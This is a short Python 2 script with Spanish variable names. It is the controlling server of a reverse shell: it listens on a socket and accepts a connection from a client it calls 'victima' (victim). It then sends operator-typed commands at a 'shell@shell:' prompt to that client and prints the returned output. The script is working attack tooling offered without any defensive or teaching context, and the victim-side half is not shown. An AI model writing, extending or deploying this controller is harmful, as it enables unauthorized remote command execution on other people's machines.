#!/usr/bin/env python
# coding=utf8

import socket

def main():
	server = socket.socket()
	server.bind(('localhost',5000))
	server.listen(1)

	while True:
		victima, direccion = server.accept()
		print("Conexión de: {}".format(direccion))

		ver = victima.recv(1024)
		
		if ver == "1":
			while True:
				opcion = raw_input("shell@shell: ")
				victima.send(opcion)
				resultado = victima.recv(2048)
				print(resultado)

if __name__ == '__main__':
		try:
			main()
		except KeyboardInterrupt:
			exit()